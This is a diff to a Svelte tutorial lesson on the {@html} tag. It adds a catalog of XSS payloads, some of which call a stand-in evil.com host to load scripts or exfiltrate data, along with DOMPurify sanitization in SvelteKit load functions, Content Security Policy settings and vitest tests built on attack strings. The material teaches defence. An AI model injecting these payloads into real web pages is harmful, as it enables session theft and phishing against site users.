@@ -72,13 +72,40 @@ If a user types the following into the input:
 
 The \`{@html}\` tag injects this as a real \`<img>\` element. The browser tries to load the image from \`"x"\`, fails, and executes the \`onerror\` handler -- which redirects the user to an attacker-controlled server, sending their session cookie in the URL. The attacker now has the user's session.
 
-Other attack vectors include:
+### Comprehensive XSS Attack Vector Catalog
 
-- \`<script>alert('XSS')</script>\` -- Note: scripts inserted via \`innerHTML\` do not execute in modern browsers, but this is NOT a reliable defense.
-- \`<svg onload="maliciousCode()">\` -- SVG event handlers DO execute.
-- \`<a href="javascript:maliciousCode()">Click me</a>\` -- JavaScript URLs execute on click.
-- \`<style>body { display: none }</style>\` -- CSS injection can hide the page or exfiltrate data.
-- \`<iframe src="https://evil.com/phishing-page"></iframe>\` -- Embed phishing content.
+Understanding the full range of attack vectors helps you appreciate why sanitization must be thorough. Here are the most common and dangerous patterns:
+
+**Event handler injection** -- The most versatile attack vector. Almost any HTML element can carry an event handler:
+- \`<img src="x" onerror="maliciousCode()">\` -- Fires immediately when src fails
+- \`<svg onload="maliciousCode()">\` -- SVG event handlers DO execute
+- \`<body onload="maliciousCode()">\` -- Body load events
+- \`<input onfocus="maliciousCode()" autofocus>\` -- Auto-triggered via autofocus
+- \`<marquee onstart="maliciousCode()">\` -- Legacy elements still work
+- \`<video><source onerror="maliciousCode()"></video>\` -- Nested elements
+
+**Script injection** -- Note: scripts inserted via \`innerHTML\` do not execute in modern browsers, but this is NOT a reliable defense:
+- \`<script>alert('XSS')</script>\` -- Blocked by innerHTML but NOT by document.write
+- \`<script src="https://evil.com/payload.js"></script>\` -- Also blocked by innerHTML
+
+**URL scheme attacks** -- JavaScript can execute from URL attributes:
+- \`<a href="javascript:maliciousCode()">Click me</a>\` -- JavaScript URLs execute on click
+- \`<iframe src="javascript:maliciousCode()">\` -- Executes in iframe context
+- \`<form action="javascript:maliciousCode()">\` -- Executes on form submit
+- \`<object data="javascript:maliciousCode()">\` -- Executes via object element
+
+**CSS-based attacks** -- Less obvious but still dangerous:
+- \`<style>body { display: none }</style>\` -- CSS injection can hide the page
+- \`<style>* { background: url('https://evil.com/track?data=' + ...) }</style>\` -- Data exfiltration via CSS
+- \`<div style="background: url('https://evil.com/log')">\` -- Single-element tracking
+
+**Embedding attacks:**
+- \`<iframe src="https://evil.com/phishing-page"></iframe>\` -- Embed phishing content
+- \`<object data="https://evil.com/malware.swf">\` -- Embed executable content
+- \`<embed src="https://evil.com/payload">\` -- Similar to object
+
+**Mutation XSS (mXSS)** -- Content that looks safe in one context but becomes dangerous after DOM parsing:
+- \`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>\` -- The browser's HTML parser may restructure this HTML, causing sanitizers to miss the payload
 
 The rule is absolute: **never pass unsanitized user input to {@html}**. If the content comes from a user, a URL parameter, a database field that users can edit, or any other untrusted source, it MUST be sanitized first.`
 		},
@@ -135,7 +162,7 @@ const withData = DOMPurify.sanitize(dirty, {
 });
 \`\`\`
 
-### SSR Considerations with DOMPurify
+### SSR Considerations: isomorphic-dompurify in SvelteKit
 
 DOMPurify relies on the DOM API (\`document.createElement\`, etc.). On the server during SSR, there is no DOM. You have two options:
 
@@ -163,6 +190,88 @@ const sanitized = $derived(
 \`\`\`
 
 Option 1 is preferred for SEO since the sanitized HTML is included in the server-rendered page.
+
+### Server-Side Sanitization in SvelteKit Load Functions
+
+The most secure pattern is to sanitize HTML on the server before it ever reaches the client. In SvelteKit, you can sanitize in your \`load\` function:
+
+\`\`\`typescript
+// +page.server.ts
+import DOMPurify from 'isomorphic-dompurify';
+
+export async function load({ params }) {
+  const response = await fetch(\`https://cms.example.com/api/posts/\${params.slug}\`);
+  const post = await response.json();
+
+  return {
+    title: post.title,
+    // Sanitize before sending to client
+    body: DOMPurify.sanitize(post.htmlBody, {
+      ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'strong', 'em', 'a', 'ul', 'ol', 'li',
+                     'blockquote', 'code', 'pre', 'img', 'figure', 'figcaption'],
+      ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'target', 'rel'],
+      ALLOW_DATA_ATTR: false
+    }),
+    publishedAt: post.publishedAt
+  };
+}
+\`\`\`
+
+\`\`\`svelte
+<!-- +page.svelte -->
+<script lang="ts">
+  let { data } = $props();
+</script>
+
+<article>
+  <h1>{data.title}</h1>
+  {@html data.body}
+</article>
+\`\`\`
+
+This pattern has several advantages. The sanitization happens on the server, so the client never receives unsanitized HTML. The DOMPurify configuration is centralized in one place. And the \`+page.server.ts\` file never runs in the browser, so you can use the full \`dompurify\` package without worrying about bundle size -- \`isomorphic-dompurify\` includes \`jsdom\`, but in a server-only file that cost is irrelevant.
+
+## Content Security Policy (CSP) Integration
+
+Even with DOMPurify, defense in depth is important. Content Security Policy headers provide a second layer of protection that limits what injected scripts can do, even if they somehow bypass sanitization.
+
+### Setting CSP in SvelteKit
+
+\`\`\`typescript
+// svelte.config.js
+const config = {
+  kit: {
+    csp: {
+      directives: {
+        'script-src': ['self'],
+        'style-src': ['self', 'unsafe-inline'],  // needed for Svelte scoped styles
+        'img-src': ['self', 'https://trusted-cdn.com'],
+        'frame-src': ['none'],
+        'object-src': ['none']
+      }
+    }
+  }
+};
+\`\`\`
+
+With this CSP in place, even if an attacker injects \`<script src="https://evil.com/payload.js"></script>\`, the browser will refuse to load it because \`evil.com\` is not in the \`script-src\` allowlist. This does not replace sanitization -- it is an additional safety net.
+
+### CSP and {@html} Interaction
+
+CSP's \`script-src\` directive blocks inline scripts and external script loads. This catches many XSS payloads but NOT all. Event handler attributes (\`onerror\`, \`onload\`, etc.) are governed by \`script-src\` in modern browsers if you omit \`'unsafe-inline'\` from the directive. However, CSS injection and URL-based attacks (\`javascript:\` URLs) require additional directives.
+
+A robust CSP for applications using \`{@html}\` should include:
+
+\`\`\`
+script-src 'self' 'nonce-{random}';
+style-src 'self' 'unsafe-inline';
+img-src 'self' https:;
+frame-src 'none';
+object-src 'none';
+base-uri 'self';
+\`\`\`
+
+The \`base-uri 'self'\` directive prevents \`<base>\` tag injection, which could redirect all relative URLs to an attacker-controlled domain. The \`frame-src 'none'\` prevents iframe injection for phishing.
 
 ## Building a Markdown Renderer
 
@@ -304,7 +413,103 @@ Explain every way an attacker could exploit this code. Then rewrite it to be sec
 		},
 		{
 			type: 'text',
-			content: `## Advanced Patterns with {@html}
+			content: `## Testing Sanitization
+
+When you use \`{@html}\` in a production application, you should test that your sanitization is working correctly. Testing sanitization catches configuration mistakes before they reach production.
+
+### Unit Testing DOMPurify Configuration
+
+\`\`\`typescript
+// sanitize.ts -- centralized sanitization config
+import DOMPurify from 'isomorphic-dompurify';
+
+export function sanitizeComment(html: string): string {
+  return DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'code'],
+    ALLOWED_ATTR: ['href', 'target', 'rel']
+  });
+}
+
+// sanitize.test.ts
+import { describe, it, expect } from 'vitest';
+import { sanitizeComment } from './sanitize';
+
+describe('sanitizeComment', () => {
+  it('preserves safe formatting tags', () => {
+    const input = '<p>Hello <strong>world</strong></p>';
+    expect(sanitizeComment(input)).toBe('<p>Hello <strong>world</strong></p>');
+  });
+
+  it('strips script tags', () => {
+    const input = '<script>alert("xss")</script><p>safe</p>';
+    expect(sanitizeComment(input)).toBe('<p>safe</p>');
+  });
+
+  it('strips event handlers from elements', () => {
+    const input = '<img src="x" onerror="alert(1)">';
+    const result = sanitizeComment(input);
+    expect(result).not.toContain('onerror');
+  });
+
+  it('strips javascript: URLs', () => {
+    const input = '<a href="javascript:alert(1)">click</a>';
+    const result = sanitizeComment(input);
+    expect(result).not.toContain('javascript:');
+  });
+
+  it('strips iframe elements', () => {
+    const input = '<iframe src="https://evil.com"></iframe><p>safe</p>';
+    expect(sanitizeComment(input)).toBe('<p>safe</p>');
+  });
+
+  it('strips SVG with onload', () => {
+    const input = '<svg onload="alert(1)"><circle r="10"/></svg>';
+    const result = sanitizeComment(input);
+    expect(result).not.toContain('onload');
+  });
+
+  it('preserves safe links with href', () => {
+    const input = '<a href="https://svelte.dev">Svelte</a>';
+    expect(sanitizeComment(input)).toBe('<a href="https://svelte.dev">Svelte</a>');
+  });
+
+  it('strips disallowed tags but keeps content', () => {
+    const input = '<div><span>hello</span></div>';
+    expect(sanitizeComment(input)).toBe('hello');
+  });
+});
+\`\`\`
+
+### Integration Testing with Svelte Components
+
+For component-level testing, verify that the rendered output contains sanitized HTML:
+
+\`\`\`typescript
+// CommentPreview.test.ts
+import { render } from '@testing-library/svelte';
+import CommentPreview from './CommentPreview.svelte';
+
+it('renders sanitized HTML without script execution', () => {
+  const maliciousInput = '<img src=x onerror=alert(1)><p>legit content</p>';
+  const { container } = render(CommentPreview, { props: { content: maliciousInput } });
+
+  // Verify the onerror attribute was stripped
+  const img = container.querySelector('img');
+  expect(img?.getAttribute('onerror')).toBeNull();
+
+  // Verify safe content is preserved
+  expect(container.textContent).toContain('legit content');
+});
+\`\`\`
+
+### Key Testing Principles
+
+1. **Test known attack vectors.** Maintain a list of XSS payloads and verify each is neutralized.
+2. **Test allowlist boundaries.** Verify that allowed tags and attributes are preserved while everything else is stripped.
+3. **Test edge cases.** Nested tags, malformed HTML, mixed content, and very long strings.
+4. **Update tests when DOMPurify is upgraded.** New versions may change default behavior.
+
+## Advanced Patterns with {@html}
 
 ### Syntax Highlighting
 
@@ -354,7 +559,7 @@ For large HTML documents (like a full blog post), the initial \`{@html}\` render
 
 ## Summary
 
-The \`{@html}\` tag renders raw HTML strings into the DOM without escaping. It exists for legitimate use cases like CMS content, markdown rendering, SVG injection, and syntax highlighting. The critical rule: never use \`{@html}\` with unsanitized user input. Always sanitize with DOMPurify (or \`isomorphic-dompurify\` for SSR). Remember that \`{@html}\` content is inert -- no Svelte bindings, events, or components work inside it. For interactive template fragments, use \`{@render}\` with snippets instead. When you must add interactivity to \`{@html}\` content, use \`$effect\` with manual DOM queries and event listeners.`
+The \`{@html}\` tag renders raw HTML strings into the DOM without escaping. It exists for legitimate use cases like CMS content, markdown rendering, SVG injection, and syntax highlighting. The critical rule: never use \`{@html}\` with unsanitized user input. Always sanitize with DOMPurify (or \`isomorphic-dompurify\` for SSR). For server-rendered SvelteKit applications, sanitize in load functions before data reaches the client. Layer Content Security Policy headers as defense in depth. Test your sanitization configuration with known attack vectors. Remember that \`{@html}\` content is inert -- no Svelte bindings, events, or components work inside it. For interactive template fragments, use \`{@render}\` with snippets instead. When you must add interactivity to \`{@html}\` content, use \`$effect\` with manual DOM queries and event listeners.`
 		},
 		{
 			type: 'concept-callout',
